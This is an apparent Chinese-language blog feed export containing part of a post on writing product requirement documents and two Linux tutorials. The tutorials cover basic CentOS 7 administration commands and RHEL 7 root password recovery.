<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011155426192.png" alt="image-20201011155426192"></p>
<p>3、禅道</p>
<p>禅道是我国开发的一款开源项目管理软件，分为开源版本和专业版本。它的主要管理思想基于国际流行的敏捷项目管理方法——Scrum。Scrum方法注重实效，操作性强，非常适合软件研发项目的快速迭代开发。</p>
<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011155527213.png" alt="image-20201011155527213"></p>
<p>禅道明确地将产品、项目、测试三者概念区分开，产品人员、开发团队、测试人员，三者分立，互相配合，又互相制约，通过需求、任务、bug来进行交相互动，最终通过项目拿到合格的产品。</p>
<p>总体来讲，禅道集产品管理、项目管理、质量管理、文档管理、组织管理和事务管理于一体，是一款专业的研发项目管理软件，完整覆盖了研发项目管理的核心流程。也就是说，它是专门针对软件研发项目管理的专业工具。</p>
<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011155703831.png" alt="image-20201011155703831"></p>
<h2 id="产品PRD文档"><a href="#产品PRD文档" class="headerlink" title="产品PRD文档"></a>产品PRD文档</h2><p>在完成分析功能角色、分析业务流程、梳理产品结构、绘制原型这些工作之后，一个定义清晰、功能逻辑结构明确、信息结构和体验效果具象的产品已经鲜活地浮现在眼前。接下来的工作就是集合前期所有的设计成果，按一定的方式把这些成果进行归集和说明，形成文档输出，以便于其他相关人员理解和把握产品，按规划设计开展进一步的产品开发与实现的工作。一般为了让产品其他关联人员明确理解产品需求，需要产品经理输出的文档有BRD（商业需求文档）、MRD（市场需求文档）和PRD（产品需求文档）。在实际工作中，BRD和MRD通常由更高级别的角色负责决断，比如直接由公司老板或者负责产品的高管具体判断和决策。对于一般产品经理而言，最主要的是负责输出PRD。</p>
<h2 id="什么是PRD文档"><a href="#什么是PRD文档" class="headerlink" title="什么是PRD文档"></a>什么是PRD文档</h2><p>PRD（product requirement document）是指产品需求文档，它以文档的形式定义、说明产品需求，让团队内成员明确产品需求，达成共识，从而面向一致的目标和方向推进后续的工作。几乎团队的所有成员都会使用到PRD：研发人员、测试人员、交互设计师、运营人员等。例如研发人员根据PRD获知整个产品的逻辑，进而搭建产品架构进行开发；测试人员可以根据PRD建立测试用例；交互设计则可以根据PRD来设计交互细节。总之，在产品项目正式进入开发阶段之前，PRD是必须通过评审确定的重要文档。</p>
<p>PRD文档的形式主要有：Word和原型两种类型。有的产品设计人员习惯撰写Word来写PRD，有的产品设计人员则直接用原型来制作。目前来说，使用Word形式的PRD还是主流。</p>
<h2 id="PRD文档组成"><a href="#PRD文档组成" class="headerlink" title="PRD文档组成"></a>PRD文档组成</h2><p>PRD文档通常包括以下几个部分：</p>
<h4 id="文档信息"><a href="#文档信息" class="headerlink" title="文档信息"></a>文档信息</h4><p>文档信息包括文档版本号、文档编号、产品名、归属部门/项目、编写人和编写日期等信息，如表5-9所示。一般来说，版本的命名格式是：××产品××××需求PRD_V2。</p>
<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011115912741.png" alt="image-20201011115912741"></p>
<h4 id="版本记录"><a href="#版本记录" class="headerlink" title="版本记录"></a>版本记录</h4><p>版本记录信息包括：版本号、修订人、修订日期、修订内容和修订原因，如下表。文档“版本号”显示的当前修改的内容属于文档的第几个版本，“修订说明”这一部分需说明具体修改了哪些内容，以及修改的原因，以便阅读人理解。</p>
<p><img src="/2020/10/11/%E4%BA%A7%E5%93%81%E6%96%87%E6%A1%A3%E8%BE%93%E5%87%BA/image-20201011120024165.png" alt="image-20201011120024165"></p>
<h4 id="目录"><a href="#目录" class="headerlink" title="目录"></a>目录</h4><p>主要是展示文档的范围和结构。</p>
<h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>这一部分是对整个PRD的概述，介绍文档的目的、文档的使用对象、名词说明和参考资料。有的文档中会出现一些新的名词，在这里应该解释一下这些名词，方便适用对象的阅读。</p>
<h4 id="产品概述"><a href="#产品概述" class="headerlink" title="产品概述"></a>产品概述</h4><p>这部分是要对产品进行一个总体的概要说明。具体包括：产品概述、用户说明、运行环境等。</p>
<p>1、产品目标：介绍产品的研发背景和目标；</p>
<p>2、用户说明：介绍产品的最终使用者，以及使用者的角色和操作行为；</p>
<p>3、产品功能：包括总体的业务流程图、产品的功能结构图以及对应的优先级；</p>
<p>4、运行环境：说明产品上线后的使用环境，例如操作系统要求、使用的浏览器类型及其版本要求等；</p>
<p>5、项目周期：这部分介绍产品需求、设计、开发、测试、上线等的相关周期；</p>
<p>6、产品风险：描述产品可能存在的风险内容、可能的原因、造成的危害，以及相应的应对策略。</p>
<h4 id="功能性需求"><a href="#功能性需求" class="headerlink" title="功能性需求"></a>功能性需求</h4><p><strong>产品的功能性需求是PRD的核心内容。</strong>功能性需求是指有具体的完成内容的需求，例如：客户登录、邮箱网站的收发邮件、论坛网站的发帖留言等。相对应的还有非功能性需求，这是指软件产品为满足用户业务需求而必须具有且除功能性需求以外的特性，例如：产品性能方面的需求（比如能承担20万人同时使用），或者运营等其他部门的需求。</p>
<p>撰写产品的系统功能性需求时可从以下几个方面考虑：</p>
<p>1、需求信息</p>
<p>需求信息包括需求名称以及需求的优先级，优先级可以直接按序号来表示。</p>
<p>2、需求说明</p>
<p>需求说明是对某一项需求功能进行描述，描述清楚功能的使用者、使用场景、使用动作与步骤、使用结果。</p>
<p>3、功能用例图</p>
<p>这里要用用例图来说明此功能的具体情况。</p>
<p>4、功能流程图</p>
<p>这里即是用流程图展示此功能的运行情况。</p>
<p>5、产品界面流程</p>
<p>这部分要呈现上述用例图和流程图所描述的功能的产品原型界面。除了静态的原型界面，在原型界面上还要附上各个部件的文字说明，以及页面的动作和跳转逻辑。</p>
<p>6、相关数据字段</p>
<p>数据字段是数据库中的概念。我们把数据表中的每一行叫作一个“记录”，而表中每一列的数据都是属于同一类的，这个数据类型就是数据字段。比如设计一款产品的注册登录功能，需要收集用户的账号、密码、手机号这些信息，那么用户的“账号”“密码”“手机号”就是你要确定的数据字段。这其实与前面梳理产品的信息结构是对应的，产品的信息结构中规定了什么信息，产品开发时就要设计相应的字段进行记录。</p>
<h4 id="非功能性需求"><a href="#非功能性需求" class="headerlink" title="非功能性需求"></a>非功能性需求</h4><p>一般情况下非功能性需求包括以下两类：</p>
<p>1、产品性能方面需求</p>
<p>包括产品性能需求、测试环境需求、产品数据统计需求、安全性需求、产品兼容性需求等。</p>
<p>产品性能需求是指用户承载量、产品响应速度等类似的需求。</p>
<p>测试环境的需求包括产品测试环境与正式上线环境的需求。</p>
<p>产品数据统计需求主要包括相关事件埋点的统计需求、接入第三方数据统计接口的需求。</p>
<p>安全性需求则是包括恶意注册防范需求、恶意刷数据防范需求等。</p>
<p>产品兼容性需求很好理解，主要表现为产品在客户端和Web端的各种需求，例如主流设备的尺寸。</p>
<p>2、其他业务/部门的要求</p>
<p>这包括产品营销需求、运营需求、财务需求、法务需求、使用帮助、问题反馈等。确定这些需求时需要与产品相关部门进行沟通。只有充分地沟通，才能让更多的人协助产品的正常使用与上线。一般撰写PRD不一定包含以上所有的非功能性需求，根据实际情况选择即可。</p>
<h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>在实际工作中，有的PRD在描述完非功能性需求以后就结束了，有的还需要增添一些其他内容。例如运营计划，需要在这里介绍产品上线后如何运营，目标受众是什么，建议的推广策略，问题反馈途径，亮点宣传，以及与运营人员的协作方式，等等。</p>
<p>PRD文档没有统一的模板，这取决于产品团队的习惯，每个团队、每个产品设计人员都可能撰写出不同风格的文档。只要能够表述清楚产品的需求，文档的阅读者能够达成对产品的一致理解，并获取所需的信息即可。也就是说，PRD的核心意义在于沟通产品需求，以便达成切实一致的理解，所以只要内容清楚，有利于达成这个核心目标即可。</p>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>日常踩坑</tag>
      </tags>
  </entry>
  <entry>
    <title>Centos7.1基础命令集</title>
    <url>/2020/10/14/Centos7-1%E5%9F%BA%E7%A1%80%E5%91%BD%E4%BB%A4%E9%9B%86/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<h2 id="系统"><a href="#系统" class="headerlink" title="系统"></a>系统</h2><p>查看系统版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">rpm -q centos-release或cat &#x2F;etc&#x2F;redhat-release或more &#x2F;etc&#x2F;*release</span><br></pre></td></tr></table></figure>
<p>查看内核版本：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;version或uname -a</span><br></pre></td></tr></table></figure>
<p>查看硬件CPU核数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;cpuinfo | grep name | cut -f2 -d: | uniq -c</span><br><span class="line">或 cat &#x2F;proc&#x2F;cpuinfo</span><br></pre></td></tr></table></figure>
<p>查看运行模式-CPU运行在多少位模式下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">getconf LONG_BIT</span><br></pre></td></tr></table></figure>
<p>查看系统运行时长/负载数：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">uptime</span><br></pre></td></tr></table></figure>
<h2 id="资源"><a href="#资源" class="headerlink" title="资源"></a>资源</h2><p>查看内存：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;proc&#x2F;meminfo  内存的详细信息</span><br></pre></td></tr></table></figure>
<p>查看各分区使用情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">df -h</span><br></pre></td></tr></table></figure>
<p>查看指定目录大小：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">du -sh 目录名</span><br></pre></td></tr></table></figure>
<p>查看所有分区：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">fdisk -l</span><br></pre></td></tr></table></figure>
<p>查看所有交换分区：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">swapon -s</span><br></pre></td></tr></table></figure>
<h2 id="网络"><a href="#网络" class="headerlink" title="网络"></a>网络</h2><p>查看所有网络接口信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ifconfig</span><br></pre></td></tr></table></figure>
<p>网络服务[重启|停止|开始]：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl  restart&#x2F;stop&#x2F;start  network.service</span><br></pre></td></tr></table></figure>
<p>查看网卡带宽：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ethtool 网卡名</span><br></pre></td></tr></table></figure>
<p>确定网卡：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ethtool -p eno1  一直闪烁的口为网口eno1</span><br></pre></td></tr></table></figure>
<p>查看路由表：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">route -n</span><br></pre></td></tr></table></figure>
<p>查看所有监听端口：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat -lntp</span><br></pre></td></tr></table></figure>
<p>查看所有已经建立的连接：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">netstat  -antp</span><br></pre></td></tr></table></figure>
<p>某端口的使用情况：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">lsof -i:端口号</span><br></pre></td></tr></table></figure>
<p>配置网卡信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;sysconfig&#x2F;network-scripts&#x2F;ifcfg-XXX</span><br><span class="line">TYPE&#x3D;Ethernet</span><br><span class="line">BOOTPROTO&#x3D;static</span><br><span class="line">NAME&#x3D;&quot;eno1&quot;</span><br><span class="line">IPADDR&#x3D;192.168.5.x</span><br><span class="line">NETMASK&#x3D;255.255.255.0</span><br><span class="line">GATEWAY&#x3D;192.168.5.1</span><br><span class="line">DEVICE&#x3D;&quot;eno1&quot;</span><br><span class="line">ONBOOT&#x3D;yes</span><br><span class="line">NETBOOT&#x3D;yes</span><br><span class="line">UUID&#x3D;&quot;a904ac18-b95a-49ae-94e6-be8266fe6a6b&quot;</span><br></pre></td></tr></table></figure>
<h2 id="时间"><a href="#时间" class="headerlink" title="时间"></a>时间</h2><p>时区调整：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timedatectl set-local-rtc 1   #将硬件时钟调整与本地时钟一致</span><br><span class="line">timedatectl set-timezone Asia&#x2F;Shanghai  #设置系统时区为上海</span><br></pre></td></tr></table></figure>
<p>时间调整：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">date -s 2012-11-10 10:20:20</span><br></pre></td></tr></table></figure>
<p>设置RTC(硬件时钟)：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">hwclock --systohc  设置硬件时间，使硬件时钟与系统时间同步</span><br></pre></td></tr></table></figure>
<p>查看时间：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">timedatectl</span><br></pre></td></tr></table></figure>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>查看所有进程：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ps -ef |grep tomcat[进程关键字]</span><br></pre></td></tr></table></figure>
<p>实时显示进程状态：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">top</span><br></pre></td></tr></table></figure>
<h2 id="用户"><a href="#用户" class="headerlink" title="用户"></a>用户</h2><p>查看活动用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">w</span><br></pre></td></tr></table></figure>
<p>查看指定用户信息：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">id &lt;用户名&gt;</span><br></pre></td></tr></table></figure>
<p>查看用户登录日志：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">last</span><br></pre></td></tr></table></figure>
<p>查看系统所有用户：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cut -d: -f1 &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<h2 id="服务"><a href="#服务" class="headerlink" title="服务"></a>服务</h2><p>开启服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start 名称.service</span><br></pre></td></tr></table></figure>
<p>重启服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl restart 名称.service</span><br></pre></td></tr></table></figure>
<p>停止服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl stop 名称.service</span><br></pre></td></tr></table></figure>
<p>开机启动：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl enable 名称.service</span><br></pre></td></tr></table></figure>
<p>当前状态：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl status 名称.service</span><br></pre></td></tr></table></figure>
<h2 id="防火墙"><a href="#防火墙" class="headerlink" title="防火墙"></a>防火墙</h2><p>centos7的防火墙用的是firewalld,它是动态的，可通过命令添加开启端口。</p>
<p>启动服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl start firewalld</span><br></pre></td></tr></table></figure>
<p>停止服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld</span><br></pre></td></tr></table></figure>
<p>查看状态：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl status firewalld</span><br></pre></td></tr></table></figure>
<p>禁用服务：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl disable  firewalld</span><br></pre></td></tr></table></figure>
<p>开启端口命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">永久开启80端口：firewall-cmd -zone&#x3D;public --add-port&#x3D;80&#x2F;tcp -permanent</span><br><span class="line">--add-port&#x3D;80&#x2F;tcp #添加端口，格式为：端口&#x2F;通讯协议</span><br><span class="line">-permanent #永久生效，没有此参数重启后失效</span><br></pre></td></tr></table></figure>
<p>更新防火墙规则：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">firewall-cmd --reload</span><br></pre></td></tr></table></figure>
<h2 id="iptables"><a href="#iptables" class="headerlink" title="iptables"></a>iptables</h2><p>关闭firwalld：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">systemctl stop firewalld.service #停止firewall</span><br><span class="line">systemctl disable firewalld.service #禁止firewall开机启动</span><br><span class="line">firewall-cmd --state #查看默认防火墙状态（关闭后显示not running，开启后显示running）</span><br></pre></td></tr></table></figure>
<p>编辑iptables：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">vi&#x2F;etc&#x2F;sysconfig&#x2F;iptables #编辑防火墙配置文件</span><br><span class="line">*filter</span><br><span class="line">:INPUT ACCEPT [0:0]</span><br><span class="line">:FORWARD ACCEPT[0:0]</span><br><span class="line">:OUTPUT ACCEPT[0:0]</span><br><span class="line">-A INPUT -m state--state RELATED,ESTABLISHED -j ACCEPT</span><br><span class="line">-A INPUT -p icmp -jACCEPT</span><br><span class="line">-A INPUT -i lo -jACCEPT</span><br><span class="line">-A INPUT -p tcp -mstate --state NEW -m tcp --dport 22 -j ACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 80 -jACCEPT</span><br><span class="line">-A INPUT -p tcp -m state --state NEW -m tcp --dport 8080-j ACCEPT</span><br><span class="line">-A INPUT -j REJECT--reject-with icmp-host-prohibited</span><br><span class="line">-A FORWARD -j REJECT --reject-with icmp-host-prohibited</span><br><span class="line">COMMIT</span><br><span class="line">:wq! #保存退出</span><br><span class="line"></span><br><span class="line">systemctl restart iptables.service #最后重启防火墙使配置生效</span><br><span class="line">systemctl enable iptables.service #设置防火墙开机启动</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>问题解决</category>
      </categories>
      <tags>
        <tag>日常踩坑</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux基础</title>
    <url>/2020/10/14/Linux%E5%9F%BA%E7%A1%80/</url>
    <content><![CDATA[<hr>
<a id="more"></a>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201015111629482.png" alt="image-20201015111629482" style="zoom:25%;"></p>
<h2 id="密码重置"><a href="#密码重置" class="headerlink" title="密码重置"></a>密码重置</h2><p>重置root管理员的密码：</p>
<p>先确定是否为RHEL 7系统。如果是，然后再进行下面的操作。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;redhat-release</span><br></pre></td></tr></table></figure>
<p>重启Linux系统主机并出现引导界面时，按下键盘上的e键进入内核编辑界面，如图:</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014180103083.png" alt="image-20201014180103083"></p>
<p>在linux16参数这行的最后面追加“rd.break”参数，然后按下Ctrl+X组合键来运行修改过的内核程序</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014180224557.png" alt="image-20201014180224557"></p>
<p>大约30秒过后，进入到系统的紧急求援模式</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014180437309.png" alt="image-20201014180437309"></p>
<p>依次输入以下命令，等待系统重启操作完毕，然后就可以使用新密码来登录Linux系统了</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mount -o remount,rw  &#x2F;sysroot</span><br><span class="line">chroot  &#x2F;sysroot</span><br><span class="line">passwd</span><br><span class="line">touch  &#x2F;.autorelabel</span><br><span class="line">exit</span><br><span class="line">reboot</span><br></pre></td></tr></table></figure>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014180700619.png" alt="image-20201014180700619"></p>
<h2 id="RPM"><a href="#RPM" class="headerlink" title="RPM"></a>RPM</h2><p>RPM有点像Windows系统中的控制面板，会建立统一的数据库文件，详细记录软件信息并能够自动分析依赖关系。</p>
<p>常用的RPM软件包命令：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014180805106.png" alt="image-20201014180805106"></p>
<p>常见yum命令：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014180855181.png" alt="image-20201014180855181"></p>
<h2 id="系统工作命令"><a href="#系统工作命令" class="headerlink" title="系统工作命令"></a>系统工作命令</h2><h4 id="echo命令"><a href="#echo命令" class="headerlink" title="echo命令"></a>echo命令</h4><p>echo命令用于在终端输出字符串或变量提取后的值，格式为“echo [字符串 | $变量]”。</p>
<p>使用$变量的方式提取变量SHELL的值，并将其输出到屏幕上：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">echo $SHELL</span><br><span class="line">&#x2F;bin&#x2F;bash</span><br></pre></td></tr></table></figure>
<h4 id="date命令"><a href="#date命令" class="headerlink" title="date命令"></a>date命令</h4><p>date命令用于显示及设置系统的时间或日期，格式为“date [选项] [+指定的格式]”。</p>
<p>date命令中的参数以及作用：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014181414166.png" alt="image-20201014181414166"></p>
<h4 id="reboot命令"><a href="#reboot命令" class="headerlink" title="reboot命令"></a>reboot命令</h4><p>reboot命令用于重启系统，其格式为reboot。</p>
<p>重启计算机这种操作会涉及硬件资源的管理权限，因此默认只能使用root管理员来重启，其命令如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">reboot</span><br></pre></td></tr></table></figure>
<h4 id="poweroff命令"><a href="#poweroff命令" class="headerlink" title="poweroff命令"></a>poweroff命令</h4><p>poweroff命令用于关闭系统，其格式为poweroff。</p>
<h4 id="wget命令"><a href="#wget命令" class="headerlink" title="wget命令"></a>wget命令</h4><p>wget命令用于在终端中下载网络文件，格式为“wget [参数]下载地址”。</p>
<p>wget命令的参数以及作用：</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014181700177.png" alt="image-20201014181700177"></p>
<h4 id="ps命令"><a href="#ps命令" class="headerlink" title="ps命令"></a>ps命令</h4><p>ps命令用于查看系统中的进程状态，格式为“ps [参数]”。</p>
<p>常用方式：<code>ps aux</code></p>
<p>当执行ps aux命令后通常会看到如图所示的进程状态</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014181936134.png" alt="image-20201014181936134"></p>
<h4 id="top命令"><a href="#top命令" class="headerlink" title="top命令"></a>top命令</h4><p>top命令用于动态地监视进程活动与系统负载等信息，其格式为top。</p>
<p>top命令相当强大，能够动态地查看系统运维状态，完全将它看作Linux中的“强化版的Windows任务管理器”。</p>
<h4 id="pidof命令"><a href="#pidof命令" class="headerlink" title="pidof命令"></a>pidof命令</h4><p>pidof命令用于查询某个指定服务进程的PID值，格式为“pidof [参数] [服务名称]”。</p>
<p>每个进程的进程号码值（PID）是唯一的，因此可以通过PID来区分不同的进程。例如，可以使用如下命令来查询本机上sshd服务程序的PID：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pidof ssh</span><br></pre></td></tr></table></figure>
<h4 id="kill命令"><a href="#kill命令" class="headerlink" title="kill命令"></a>kill命令</h4><p>kill命令用于终止某个指定PID的服务进程，格式为“kill [参数] [进程PID]”。</p>
<p>这种操作的效果等同于强制停止服务。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kill 2516</span><br></pre></td></tr></table></figure>
<h4 id="killall命令"><a href="#killall命令" class="headerlink" title="killall命令"></a>killall命令</h4><p>killall命令用于终止某个指定名称的服务所对应的全部进程，格式为：“killall [参数] [进程名称]”。</p>
<p>复杂软件的服务程序会有多个进程协同为用户提供服务，如果逐个去结束这些进程会比较麻烦，此时可以使用killall命令来批量结束某个服务程序带有的全部进程。</p>
<h2 id="系统状态检测命令"><a href="#系统状态检测命令" class="headerlink" title="系统状态检测命令"></a>系统状态检测命令</h2><h4 id="ifconfig命令"><a href="#ifconfig命令" class="headerlink" title="ifconfig命令"></a>ifconfig命令</h4><p>ifconfig命令用于获取网卡配置与网络状态等信息，格式为“ifconfig [网络设备]参数。</p>
<h4 id="uname命令"><a href="#uname命令" class="headerlink" title="uname命令"></a>uname命令</h4><p>uname命令用于查看系统内核与系统版本等信息，格式为“uname [-a]”。</p>
<p>在使用uname命令时，一般会固定搭配上-a参数来完整地查看当前系统的内核名称、主机名、内核发行版本、节点名、系统时间、硬件名称、硬件平台、处理器类型以及操作系统名称等信息。</p>
<p>如果要查看当前系统版本的详细信息，则需要查看redhat-release文件，其命令为：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat &#x2F;etc&#x2F;redhat-release</span><br></pre></td></tr></table></figure>
<h4 id="uptime命令"><a href="#uptime命令" class="headerlink" title="uptime命令"></a>uptime命令</h4><p>uptime用于查看系统的负载信息，格式为uptime。</p>
<p>uptime命令可以显示当前系统时间、系统已运行时间、启用终端数量以及平均负载值等信息。平均负载值指的是系统在最近1分钟、5分钟、15分钟内的压力情况；负载值越低越好，尽量不要长期超过1，在生产环境中不要超过5。</p>
<h4 id="free命令"><a href="#free命令" class="headerlink" title="free命令"></a>free命令</h4><p>free用于显示当前系统中内存的使用量信息，格式为“free  -h”。</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014183203302.png" alt="image-20201014183203302"></p>
<h4 id="who命令"><a href="#who命令" class="headerlink" title="who命令"></a>who命令</h4><p>who用于查看当前登入主机的用户终端信息，格式为whoami。</p>
<h4 id="last命令"><a href="#last命令" class="headerlink" title="last命令"></a>last命令</h4><p>last命令用于查看所有系统的登录记录，格式为“last [参数]”。</p>
<h4 id="history命令"><a href="#history命令" class="headerlink" title="history命令"></a>history命令</h4><p>history命令用于显示历史执行过的命令，在使用history命令时，如果使用-c参数则会清空所有的命令历史记录。还可以使用“！编码数字”的方式来重复执行某一次的命令。</p>
<h4 id="sosreport命令"><a href="#sosreport命令" class="headerlink" title="sosreport命令"></a>sosreport命令</h4><p>sosreport命令用于收集系统配置及架构信息并输出诊断文档，格式为sosreport。</p>
<h2 id="目录切换命令"><a href="#目录切换命令" class="headerlink" title="目录切换命令"></a>目录切换命令</h2><h4 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h4><p>pwd命令用于显示用户当前所处的工作目录，格式为“pwd [选项]”。</p>
<h4 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h4><p>cd命令用于切换工作路径，格式为“cd [目录名称]”。可以通过cd命令迅速、灵活地切换到不同的工作目录。除了常见的切换目录方式，还可以使用“cd -”命令返回到上一次所处的目录，使用“cd..”命令进入上级目录，以及使用“cd ~”命令切换到当前用户的家目录，亦或使用“cd ~username”切换到其他用户的家目录。</p>
<h4 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h4><p>ls命令用于显示目录中的文件信息，格式为“ls [选项] [文件] ”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">ls -la    #查看当前目录中的所有文件并输出这些文件的属性信息</span><br></pre></td></tr></table></figure>
<h2 id="文本编辑命令"><a href="#文本编辑命令" class="headerlink" title="文本编辑命令"></a>文本编辑命令</h2><h4 id="cat命令"><a href="#cat命令" class="headerlink" title="cat命令"></a>cat命令</h4><p>cat命令用于查看纯文本文件（内容较少的），格式为“cat [选项] [文件]”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cat -n  #显示行号</span><br></pre></td></tr></table></figure>
<h4 id="more命令"><a href="#more命令" class="headerlink" title="more命令"></a>more命令</h4><p>more命令用于查看纯文本文件（内容较多的），格式为“more [选项]文件”。</p>
<p>more命令会在最下面使用百分比的形式来提示已经阅读了多少内容。可以使用空格键或回车键向下翻页。 </p>
<h4 id="head命令"><a href="#head命令" class="headerlink" title="head命令"></a>head命令</h4><p>head命令用于查看纯文本文档的前N行，格式为“head [选项] [文件]”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">head -n 20 文档  #查看文档的前20行</span><br></pre></td></tr></table></figure>
<h4 id="tail命令"><a href="#tail命令" class="headerlink" title="tail命令"></a>tail命令</h4><p>tail命令用于查看纯文本文档的后N行或持续刷新内容，格式为“tail [选项] [文件]”。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">tail -f 文件名  #实时查看最新日志文件时</span><br></pre></td></tr></table></figure>
<h4 id="tr命令"><a href="#tr命令" class="headerlink" title="tr命令"></a>tr命令</h4><p>tr命令用于替换文本文件中的字符，格式为“tr [原始字符] [目标字符]”。</p>
<h4 id="wc命令"><a href="#wc命令" class="headerlink" title="wc命令"></a>wc命令</h4><p>wc命令用于统计指定文本的行数、字数、字节数，格式为“wc [参数]文本”。</p>
<p>wc的参数以及作用:</p>
<p><img src="/2020/10/14/Linux%E5%9F%BA%E7%A1%80/image-20201014195631027.png" alt="image-20201014195631027"></p>
<p>如要统计当前系统中有多少个用户</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">wc -l  &#x2F;etc&#x2F;passwd</span><br></pre></td></tr></table></figure>
<h4 id="stat命令"><a href="#stat命令" class="headerlink" title="stat命令"></a>stat命令</h4><p>stat命令用于查看文件的具体存储信息和时间等信息，格式为“stat文件名称”。</p>
<h4 id="cut命令"><a href="#cut命令" class="headerlink" title="cut命令"></a>cut命令</h4><p>cut命令用于按“列”提取文本字符，格式为“cut [参数]文本”。</p>
<h4 id="diff命令"><a href="#diff命令" class="headerlink" title="diff命令"></a>diff命令</h4><p>diff命令用于比较多个文本文件的差异，格式为“diff [参数]文件”。</p>
